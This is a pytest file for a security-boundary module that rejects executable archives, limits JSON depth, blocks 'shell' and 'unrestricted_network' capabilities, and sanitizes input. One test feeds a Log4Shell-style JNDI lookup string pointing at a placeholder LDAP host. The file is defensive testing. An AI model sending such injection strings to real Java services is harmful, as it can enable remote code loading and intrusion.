import pytest

from qso_runtime.security_boundary import (
    SecurityBoundaryError,
    SecurityLimits,
    enforce_capability_boundary,
    inspect_artifact,
    safe_json_loads,
    sanitize_external_text,
)


def test_rejects_java_archives_and_executable_magic() -> None:
    verdict = inspect_artifact("phantomblock.jar", b"PK\x03\x04malicious")
    assert verdict.accepted is False
    assert any("executable" in reason for reason in verdict.reasons)
    assert any("magic" in reason for reason in verdict.reasons)


def test_rejects_lookup_injection_text() -> None:
    with pytest.raises(SecurityBoundaryError):
        sanitize_external_text("${jndi:ldap://example.invalid/a}")


def test_safe_json_enforces_depth() -> None:
    with pytest.raises(SecurityBoundaryError):
        safe_json_loads('[[[[1]]]]', SecurityLimits(max_json_depth=2))


def test_denied_capabilities_fail_closed() -> None:
    with pytest.raises(SecurityBoundaryError):
        enforce_capability_boundary({"reasoning", "shell", "unrestricted_network"})


def test_plain_research_artifact_is_hashable_and_accepted() -> None:
    verdict = inspect_artifact("finding.md", b"Unverified threat hypothesis")
    assert verdict.accepted is True
    assert len(verdict.sha256) == 64
